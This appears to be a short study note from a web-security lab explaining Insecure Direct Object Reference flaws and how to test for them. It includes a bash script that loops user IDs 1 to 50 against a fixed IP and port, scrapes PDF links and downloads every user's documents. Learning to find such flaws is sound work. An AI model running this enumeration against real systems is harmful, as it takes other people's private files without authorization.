**IDOR** stands for:

> **Insecure Direct Object Reference**

It means:

> A user can **access something they shouldn’t**, like **another user’s file, profile, or data**, just by changing a value in the URL or request.

- Find URLs or API calls that contain some kind of **ID, filename, or object**
- Try changing that ID to see **other people's stuff**
- If it works → It's a **vulnerability!**

simple bash script for multiple calls (if GET request is not working change it to POST or others)
```bash
#!/bin/bash

url="http://94.237.57.211:44167"

for i in {1..50}; do
  for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf"); do
    wget -q $url/$link
  done
done
```

